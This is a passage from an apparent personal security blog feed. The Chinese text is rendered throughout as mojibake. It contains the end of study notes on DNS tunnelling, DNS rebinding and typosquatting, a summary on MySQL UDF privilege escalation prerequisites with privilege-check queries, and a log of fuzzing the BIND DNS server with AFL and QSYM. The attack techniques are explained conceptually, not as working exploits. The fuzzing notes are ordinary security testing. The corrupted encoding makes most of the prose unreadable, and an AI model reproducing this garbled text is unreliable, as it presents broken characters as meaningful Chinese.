é€’ã€‚é™¤äº†é€šè¿‡å¹³å¸¸ä¼šé˜»æ­¢è¿™ç±»æµé‡çš„ç½‘ç»œç§˜å¯†å‘é€æ•°æ®å¤–ï¼Œè¿™è¿˜å¯ç”¨äºæ¬ºéª—å†…å®¹ã€é¿å…è¿‡æ»¤æˆ–é˜²ç«å¢™æ£€æµ‹ã€‚</p><blockquote><p>åˆ©ç”¨DNSè¿›è¡Œéšè”½é€šä¿¡</p></blockquote><h4 id="DNSé‡æ–°ç»‘å®š"><a href="#DNSé‡æ–°ç»‘å®š" class="headerlink" title="DNSé‡æ–°ç»‘å®š"></a>DNSé‡æ–°ç»‘å®š</h4><p>DNSé‡æ–°ç»‘å®šæ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æ–¹æ³•ï¼Œåˆ©ç”¨æµè§ˆå™¨ç¼“å­˜çš„é•¿æœŸç‰¹æ€§ï¼Œæ¬ºéª—å—å®³è€…çš„æµè§ˆå™¨åœ¨è¾“å…¥åŸŸåæ—¶è”ç³»æ¶æ„ç«™ç‚¹ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»»ä½•è”ç½‘è®¾å¤‡ï¼ˆåŒ…æ‹¬æ™ºèƒ½æ‰‹æœºï¼‰æ¥å®æ–½æ”»å‡»ï¼Œä¸éœ€è¦ä»»ä½•ç±»å‹çš„èº«ä»½éªŒè¯ã€‚å—å®³è€…å¿…é¡»ç¦ç”¨æµè§ˆå†å²è®°å½•æˆ–æ‰“å¼€æµè§ˆå™¨éšèº«çª—å£ï¼Œæ‰èƒ½ç¦ç”¨ç¼“å­˜ã€‚åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å°†å—å®³è€…æµè§ˆå™¨å¯¹åŸŸåçš„è¯·æ±‚ï¼Œé‡æ–°è·¯ç”±åˆ°æ‰˜ç®¡æœ‰å®³å†…å®¹çš„éæ³•æœåŠ¡å™¨ã€‚</p><blockquote><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿé»˜è®¤èƒ½å¤Ÿå°†DNSè¿”å›æ¥çš„è¿™ä¸ªIPåœ°å€ä¿¡æ¯ä¿å­˜60ç§’ï¼Œè€Œè¶…è¿‡60ç§’åå¦‚æœéœ€è¦å†æ¬¡è®¿é—®è¿™ä¸ªåŸŸåï¼Œå°±ä¼šé‡æ–°å»è¯·æ±‚ä¸€æ¬¡dns</p></blockquote><blockquote><p>å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œä¸¤æ¬¡è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ˜¯ç¬¦åˆæµè§ˆå™¨çš„åŒæºç­–ç•¥çš„ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡è®¿é—®è§£æåˆ°å…¶ä»–IPï¼Œè°ƒç”¨åˆ°äº†å…¶ä»–èµ„æºã€‚è¿™æ ·çš„è¡Œä¸ºè¢«ç§°ä¹‹ä¸ºåŸŸåé‡æ–°ç»‘å®šæ”»å‡»ï¼ˆDNS ReBindingï¼‰ã€‚</p></blockquote><blockquote><ul><li>ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåtest.gm7.orgçš„IPä¸º104.21.26.222</li><li>åœ¨ç”¨æˆ·ç¬¬äºŒæ¬¡è®¿é—®å‰ï¼Œä¿®æ”¹åŸŸåè§£æçš„IPä¸º127.0.0.1</li><li>ç”¨æˆ·ç¬¬äºŒæ¬¡è®¿é—®ï¼Œè§£æåŸŸåtest.gm7.orgçš„IPä¸º127.0.0.1 (ä¸€ä¸ªä¸åŒçš„ip)</li></ul></blockquote><h4 id="DNSæ‹¼å†™ä»¿å†’"><a href="#DNSæ‹¼å†™ä»¿å†’" class="headerlink" title="DNSæ‹¼å†™ä»¿å†’"></a>DNSæ‹¼å†™ä»¿å†’</h4><p>DNSæ‹¼å†™ä»¿å†’æ˜¯ä¸€ç§å—DNSåŠ«æŒå¯å‘çš„ç¤¾ä¼šå·¥ç¨‹æ”»å‡»æŠ€æœ¯ï¼Œå®ƒä½¿ç”¨åŸŸåä¸­çš„é”™åˆ«å­—å’Œæ‹¼å†™é”™è¯¯ã€‚å¸¸è§çš„DNSæ‹¼å†™ä»¿å†’æ”»å‡»å§‹äºæ”»å‡»è€…æ³¨å†Œä¸€ä¸ªåŸŸåï¼Œè¿™ä¸ªåŸŸåå’Œç›®æ ‡çš„ç½‘ç«™åŸŸåéå¸¸ç›¸ä¼¼ã€‚æ”»å‡»è€…éšåæ­å»ºä¸€ä¸ªè™šå‡ç½‘ç«™ï¼Œç½‘ç«™å†…å®¹æ—¨åœ¨è¯´æœç”¨æˆ·æä¾›æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ç™»å½•å¯†ç ã€ä¿¡ç”¨å¡èµ„æ–™åŠå…¶ä»–ä¸ªäººä¿¡æ¯ã€‚</p><blockquote><p>DNSæ‹¼å†™ä»¿å†’æ˜¯ç¤¾å·¥æŠ€æœ¯çš„ä¸€ç§æ–¹æ³•ï¼Œæ”»å‡»æ–¹æ³¨å†Œä¸€ä¸ªå’Œç½‘ç«™ç›¸ä¼¼çš„åŸŸåæ¥æ··æ·†ç”¨æˆ·ã€‚å¸¸è§åœ¨ç™»å½•å¯†ç ä»¥åŠè¯†åˆ«éªŒè¯æ–¹é¢ã€‚</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ä¸»æœºææƒ&quot;&gt;&lt;a href=&quot;#ä¸»æœºææƒ&quot; class=&quot;headerlink&quot; title=&quot;ä¸»æœºææƒ&quot;&gt;&lt;/a&gt;ä¸»æœºææƒ&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/432182767&quot;&gt;å‚è€ƒ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/304572787&quot;&gt;è“æ¡¥æ¯æ•™ç¨‹&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/linuxprivesc&quot;&gt;tryHackme&lt;/a&gt;ï¼Œè¿™æ˜¯ä¸€ä¸ªé¶åœºï¼Œæä¾›äº†21ä¸ªä¸»æœºææƒçš„task&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;UDFææƒ&quot;&gt;&lt;a href=&quot;#UDFææƒ&quot; class=&quot;headerlink&quot; title=&quot;UDFææƒ&quot;&gt;&lt;/a&gt;UDFææƒ&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;UDFå…¨åuser-defined function capability&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å®ƒå¯ä»¥é€šè¿‡å¯¹MYSQLä¸­çš„å‡½æ•°è°ƒç”¨è¿æ¥ç³»ç»Ÿä¸Šå¯ç”¨çš„ç³»ç»ŸåŠ¨æ€åº“&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;UDFæ”»å‡»æ¡ä»¶&quot;&gt;&lt;a href=&quot;#UDFæ”»å‡»æ¡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;UDFæ”»å‡»æ¡ä»¶&quot;&gt;&lt;/a&gt;UDFæ”»å‡»æ¡ä»¶&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;å¿…é¡»è·å¾—MYSQLçš„è´¦å·æœ€å¥½æ˜¯rootï¼Œç„¶åå»åˆ°MYSQLé‡Œé¢æ£€æŸ¥æ˜¯å¦æ‹¥æœ‰insertæ’å…¥æƒé™ï¼Œæ£€æŸ¥å‘½ä»¤: &lt;code&gt;select User,Host from user where Insert_priv=&amp;#39;Y&amp;#39;;&lt;/code&gt;æ˜¯å¦æœ‰è¾“å‡º&lt;/li&gt;
&lt;li&gt;å¯ä»¥æ›´æ”¹æ•°æ®åº“å½“ç„¶æ‹¿åˆ°rootæœ€å¥½&lt;/li&gt;
&lt;li&gt;å…è®¸æ‹·è´æ–‡ä»¶è¿›æ¥(æ£€æŸ¥å‘½ä»¤: &lt;code&gt;show variables like &amp;#39;local_infile&amp;#39;;&lt;/code&gt;ç»“æœä¸ºONæ‰è¡Œ)&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="ä¸»æœºææƒ" scheme="https://jingtianer.github.io/home/tags/%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/"/>
    
    <category term="åŸŸåè§£ææœåŠ¡æ‰°ä¹±" scheme="https://jingtianer.github.io/home/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%9C%8D%E5%8A%A1%E6%89%B0%E4%B9%B1/"/>
    
  </entry>
  
  <entry>
    <title>QSYM-afl-ç¯å¢ƒå®‰è£…</title>
    <link href="https://jingtianer.github.io/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/"/>
    <id>https://jingtianer.github.io/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/</id>
    <published>2023-01-11T04:15:37.000Z</published>
    <updated>2023-01-14T13:49:41.394Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘"><a class="markdownIt-Anchor" href="#ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘"></a> ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘</h2><ul><li>å¸Œæœ›ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘</li><li>é€šè¿‡<code>./configure -help</code>çŸ¥é“ï¼Œéœ€è¦é…ç½®ä¸‹é¢å‡ ä¸ªç¯å¢ƒå˜é‡ï¼Œè¾¾åˆ°æ›¿æ¢ç¼–è¯‘å™¨çš„ç›®çš„</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;afl-gcc&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CXX=<span class="string">&#x27;afl-g++&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>å¯¹bindè¿›è¡Œç¼–è¯‘</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨qsymè¿›è¡Œæµ‹è¯•ç»“åˆmopt-fast"><a class="markdownIt-Anchor" href="#ä½¿ç”¨qsymè¿›è¡Œæµ‹è¯•ç»“åˆmopt-fast"></a> ä½¿ç”¨qsymè¿›è¡Œæµ‹è¯•ï¼ˆç»“åˆMOPT-FASTï¼‰</h2><ul><li>ä½¿ç”¨æ­£å¸¸çš„<code>gcc</code>ç¼–è¯‘<code>bind</code>ï¼Œå°†ç”Ÿæˆçš„<code>named</code>å¤åˆ¶åˆ°<code>test/uninstrumented</code>ä¸‹ ï¼ˆè¿è¡Œqsyméœ€è¦ï¼‰</li><li>ä½¿ç”¨<code>afl-gcc</code>ç¼–è¯‘<code>bind</code>ï¼Œå°†ç”Ÿæˆçš„<code>named</code>å¤åˆ¶åˆ°<code>test/instrumented</code>ä¸‹ ï¼ˆè¿è¡Œafl-fuzzçš„masterå’Œslaveéœ€è¦ï¼‰</li><li>é€‰å–<code>MOPT-FAST</code>ä¸­çš„ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œå¤åˆ¶åˆ°<code>test/testcase_dir</code></li><li>æŒ‰ç…§qsymæ–‡æ¡£çš„é¡ºåºä¾æ¬¡å¯åŠ¨masterï¼Œslaveå’Œqsymï¼Œå‘½ä»¤å¦‚ä¸‹</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m 4096 -M afl-master -i testcase_dir/ -o finding_dir/ -- ./instrumented/named</span><br><span class="line">afl-fuzz -m 4096 -S afl-slave -i testcase_dir/ -o finding_dir/ -- ./instrumented/named</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€qsymç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ../qsym/venv/bin/activate</span><br><span class="line">../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><h3 id="é—®é¢˜1"><a class="markdownIt-Anchor" href="#é—®é¢˜1"></a> é—®é¢˜1</h3><ul><li>æŠ¥é”™ Pipe at the beginning of â€˜core_patternâ€™</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>ä¹‹å‰æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªvirtualenvï¼Œè¿™æ¬¡è¿è¡Œç¬¬ä¸‰ä¸ªå‘½ä»¤æ—¶ï¼Œä¹Ÿè¦å…ˆè¿›å…¥è¿™ä¸ªç¯å¢ƒä¸­</p></blockquote><h3 id="masterè¾“å‡º"><a class="markdownIt-Anchor" href="#masterè¾“å‡º"></a> masterè¾“å‡º</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                     american fuzzy lop 2.57b (afl-master)</span><br><span class="line"></span><br><span class="line">â”Œâ”€ process timing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ overall results â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚        run time : 0 days, 0 hrs, 0 min, 59 sec       â”‚  cycles <span class="keyword">done</span> : 0      â”‚</span><br><span class="line">â”‚   last new path : 0 days, 0 hrs, 0 min, 2 sec        â”‚  total paths : 15     â”‚</span><br><span class="line">â”‚ last <span class="built_in">uniq</span> crash : none seen yet                      â”‚ <span class="built_in">uniq</span> crashes : 0      â”‚</span><br><span class="line">â”‚  last <span class="built_in">uniq</span> hang : none seen yet                      â”‚   <span class="built_in">uniq</span> hangs : 0      â”‚</span><br><span class="line">â”œâ”€ cycle progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ map coverage â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="line">â”‚  now processing : 0 (0.00%)         â”‚    map density : 7.53% / 7.59%         â”‚</span><br><span class="line">â”‚ paths timed out : 0 (0.00%)         â”‚ count coverage : 1.01 bits/tuple       â”‚</span><br><span class="line">â”œâ”€ stage progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€ findings <span class="keyword">in</span> depth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="line">â”‚  now trying : havoc                 â”‚ favored paths : 1 (6.67%)              â”‚</span><br><span class="line">â”‚ stage execs : 2533/16.4k (15.46%)   â”‚  new edges on : 13 (86.67%)            â”‚</span><br><span class="line">â”‚ total execs : 3608                  â”‚ total crashes : 0 (0 unique)           â”‚</span><br><span class="line">â”‚  <span class="built_in">exec</span> speed : 50.36/sec (slow!)     â”‚  total tmouts : 4 (4 unique)           â”‚</span><br><span class="line">â”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ path geometry â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="line">â”‚   bit flips : 1/32, 0/31, 0/29                      â”‚    levels : 2          â”‚</span><br><span class="line">â”‚  byte flips : 0/4, 0/3, 0/1                         â”‚   pending : 15         â”‚</span><br><span class="line">â”‚ arithmetics : 1/224, 0/25, 0/0                      â”‚  pend fav : 1          â”‚</span><br><span class="line">â”‚  known ints : 0/25, 0/84, 0/44                      â”‚ own finds : 14         â”‚</span><br><span class="line">â”‚  dictionary : 0/0, 0/0, 0/0                         â”‚  imported : 0          â”‚</span><br><span class="line">â”‚       havoc : 0/0, 0/0                              â”‚ stability : 97.85%     â”‚</span><br><span class="line">â”‚        trim : n/a, 0.00%                            â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          [cpu000:168%]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="slave-è¾“å‡º"><a class="markdownIt-Anchor" href="#slave-è¾“å‡º"></a> slave è¾“å‡º</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   american fuzzy lop 2.57b (afl-slave)</span><br><span class="line"></span><br><span class="line">â”Œâ”€ process timing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ overall results â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚        run time : 0 days, 0 hrs, 0 min, 33 sec       â”‚  cycles <span class="keyword">done</span> : 0      â”‚</span><br><span class="line">â”‚   last new path : 0 days, 0 hrs, 0 min, 4 sec        â”‚  total paths : 14     â”‚</span><br><span class="line">â”‚ last <span class="built_in">uniq</span> crash : none seen yet                      â”‚ <span class="built_in">uniq</span> crashes : 0      â”‚</span><br><span class="line">â”‚  last <span class="built_in">uniq</span> hang : none seen yet                      â”‚   <span class="built_in">uniq</span> hangs : 0      â”‚</span><br><span class="line">â”œâ”€ cycle progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ map coverage â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="line">â”‚  now processing : 0 (0.00%)         â”‚    map density : 7.53% / 7.58%         â”‚</span><br><span class="line">â”‚ paths timed out : 0 (0.00%)         â”‚ count coverage : 1.49 bits/tuple       â”‚</span><br><span class="line">â”œâ”€ stage progress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€ findings <span class="keyword">in</span> depth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="line">â”‚  now trying : havoc                 â”‚ favored paths : 1 (7.14%)              â”‚</span><br><span class="line">â”‚ stage execs : 1163/4096 (28.39%)    â”‚  new edges on : 11 (78.57%)            â”‚</span><br><span class="line">â”‚ total execs : 1700                  â”‚ total crashes : 0 (0 unique)           â”‚</span><br><span class="line">â”‚  <span class="built_in">exec</span> speed : 50.70/sec (slow!)     â”‚  total tmouts : 12 (8 unique)          â”‚</span><br><span class="line">â”œâ”€ fuzzing strategy yields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ path geometry â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="line">â”‚   bit flips : n/a, n/a, n/a                         â”‚    levels : 2          â”‚</span><br><span class="line">â”‚  byte flips : n/a, n/a, n/a                         â”‚   pending : 14         â”‚</span><br><span class="line">â”‚ arithmetics : n/a, n/a, n/a                         â”‚  pend fav : 1          â”‚</span><br><span class="line">â”‚  known ints : n/a, n/a, n/a                         â”‚ own finds : 13         â”‚</span><br><span class="line">â”‚  dictionary : n/a, n/a, n/a                         â”‚  imported : 0          â”‚</span><br><span class="line">â”‚       havoc : 0/0, 0/0                              â”‚ stability : 53.47%     â”‚</span><br><span class="line">â”‚        trim : n/a, n/a                              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          [cpu001:166%]</span><br></pre></td></tr></table></figure><h3 id="qsym-è¾“å‡º"><a class="markdownIt-Anchor" href="#qsym-è¾“å‡º"></a> qsym è¾“å‡º</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(venv) tt@ubuntu:~/Desktop/dns/test$ ../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Temp directory=/tmp/tmpvbo369</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000037,src:000005,op:havoc,rep:2,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-0/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-0 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Total=13 s, Emulation=13 s, Solver=0 s, Return=-4</span><br><span class="line">DEBUG:qsym.afl:Generate 0 testcases</span><br><span class="line">DEBUG:qsym.afl:0 testcases are new</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000032,src:000005,op:havoc,rep:16,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-1/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-1 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Total=9 s, Emulation=9 s, Solver=0 s, Return=-4</span><br><span class="line">DEBUG:qsym.afl:Generate 0 testcases</span><br><span class="line">DEBUG:qsym.afl:0 testcases are new</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000024,src:000005,op:havoc,rep:128,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-2/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-2 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“</h2><ul><li><p><code>qsym</code>ç»“åˆ<code>mopt</code>å¯¹<code>bind</code>çš„<code>dns</code>æœåŠ¡å™¨è¿›è¡Œäº†æµ‹è¯•ï¼Œ<code>afl</code>æ€»å…±è·‘äº†<code>1 days, 11 hrs, 53 min, 22 sec</code>, å¹¶æ²¡æœ‰ç”Ÿæˆä»»ä½•testcase</p></li><li><p>æ¯æ¬¡è¾“å‡ºæ€»ä¼´éšè¿™ä¸ªè¿™ä¸ªtimeoutï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmphuJKne/qsym-out-262/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmphuJKne/qsym-out-262 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><blockquote><p>æŸ¥çœ‹äº†å¾ˆå¤š<code>issue</code>ï¼Œå‘ç°ä¸Šä¼ çš„æ—¥å¿—ä¸­å¤§å®¶ä¹Ÿéƒ½æœ‰timeout</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘&quot;&gt;&lt;/a&gt; ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å¸Œæœ›ä½¿ç”¨aflå¯¹bindè¿›è¡Œç¼–è¯‘&lt;/li&gt;
&lt;li&gt;é€šè¿‡&lt;code&gt;./configure -help&lt;/code&gt;çŸ¥é“ï¼Œéœ€è¦é…ç½®ä¸‹é¢å‡ ä¸ªç¯å¢ƒå˜é‡ï¼Œè¾¾åˆ°æ›¿æ¢ç¼–è¯‘å™¨çš„ç›®çš„&lt;/li&gt;
&lt;/ul&gt;
